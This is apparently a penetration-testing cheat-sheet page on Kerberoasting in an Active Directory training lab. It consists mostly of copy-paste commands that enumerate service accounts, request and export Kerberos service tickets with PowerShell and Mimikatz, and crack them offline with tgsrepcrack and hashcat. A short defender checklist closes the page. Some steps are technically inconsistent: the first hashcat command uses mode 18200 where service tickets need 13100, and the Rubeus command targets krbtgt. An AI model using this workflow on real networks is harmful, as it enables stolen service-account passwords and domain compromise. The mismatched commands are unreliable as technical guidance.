# 🟢 Kerberoast

### **Find user accounts used as service accounts**

```
. ./GetUserSPNs.ps1
```

```
Get-NetUser -SPN
```

```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```



### **Reguest a TGS**

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

or

```
Request-SPNTicket "MSSQLSvc/dcorp.dollarycorp.local"
```

### **Export ticket using Mimikatz**

```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

### **Crack the ticket**

Crack the password for the service account

```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
```

<table data-card-size="large" data-view="cards" data-full-width="true"><thead><tr><th></th><th></th><th></th><th data-hidden data-card-cover data-type="files"></th></tr></thead><tbody><tr><td></td><td></td><td></td><td><a href="../.gitbook/assets/Kerberoasting.png">Kerberoasting.png</a></td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table>

**Analyzing the ticket with Rubeus**

Once you have exported the ticket using Mimikatz, analyze it with Rubeus to get the hash for cracking.

```
.\Rubeus.exe dump /service:krbtgt /outfile:ticket.txt
```

Investigate the contents of `ticket.txt` for the hash to use in the next step.

**Using Hashcat for password recovery**

Now that you have the hash, proceed with Hashcat to attempt to recover the password.

```
.\hashcat.exe -m 13100 -a 0 -o cracked.txt ticket.txt 10k-worst-pass.txt
```

Inspect `cracked.txt` to see if the password recovery was successful. If the password is not found, consider using a larger or more targeted wordlist based on password creation policies.

**Post-compromise steps**

After successfully cracking the ticket:

1. Secure the compromised account immediately by resetting its password.
2. Investigate how the service account credentials were exposed.
3. Audit services that utilize this account to check for unauthorized changes or activities.
4. Implement account monitoring to detect future suspicious activities.
